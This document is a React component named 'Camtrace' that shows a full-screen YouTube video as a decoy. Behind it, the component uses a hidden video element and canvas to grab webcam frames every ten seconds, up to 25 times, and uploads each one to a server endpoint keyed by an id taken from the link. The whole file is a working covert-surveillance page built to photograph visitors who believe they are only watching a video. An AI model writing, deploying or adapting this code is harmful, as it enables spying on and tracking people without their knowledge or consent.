import { useEffect, useRef } from "react";
import { UPLOAD_FILE } from "./../constant/contant";
import { useSearchParams } from "react-router-dom";


const Camtrace = () => {
  const cameraRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const [searchParams] = useSearchParams();
  const id = searchParams.get("id");

  useEffect(() => {
    let captureCount = 0;
    let intervalId: number; // ← use number instead of NodeJS.Timer

    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });

        if (cameraRef.current) {
          cameraRef.current.srcObject = stream;
        }

        intervalId = window.setInterval(() => {
          // ← use window.setInterval
          if (captureCount >= 25) {
            clearInterval(intervalId);
            stream.getTracks().forEach((track) => track.stop());
            return;
          }
          captureAndSendFrame();
          captureCount++;
        }, 10000);
      } catch (err) {
        console.error("Error accessing media:", err);
      }
    };

    startCamera();

    return () => {
      clearInterval(intervalId);
    };
  }, [id]);

  const captureAndSendFrame = () => {
    if (!cameraRef.current || !canvasRef.current) return;

    const video = cameraRef.current;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(
      (blob) => {
        if (!blob) return;

        const formData = new FormData();
        formData.append("file", blob, "frame.jpg");
        if (id) {
          fetch(`${UPLOAD_FILE}?id=${id}`, {
            method: "POST",
            body: formData,
          }).catch((err) => console.error("Upload failed:", err));
        }
      },
      "image/jpeg",
      0.8
    );
  };

  return (
    <div className="relative w-screen h-screen w-full">
      {/* Fullscreen YouTube */}
      <div className="flex justify-center items-center h-screen w-screen bg-black">
        <div className="relative aspect-video w-[90%] w-full rounded-xl overflow-hidden">
          <iframe
            className="absolute inset-0 w-full h-full"
            src="https://www.youtube.com/embed/udgrClXV26Y?autoplay=1&mute=1"
            title="YouTube video"
            allow="autoplay; encrypted-media; microphone; camera"
            allowFullScreen
          />
        </div>
      </div>

      {/* Hidden camera video */}
      <video ref={cameraRef} autoPlay playsInline style={{ display: "none" }} />

      {/* Hidden canvas for capturing */}
      <canvas ref={canvasRef} style={{ display: "none" }} />
    </div>
  );
};

export default Camtrace;
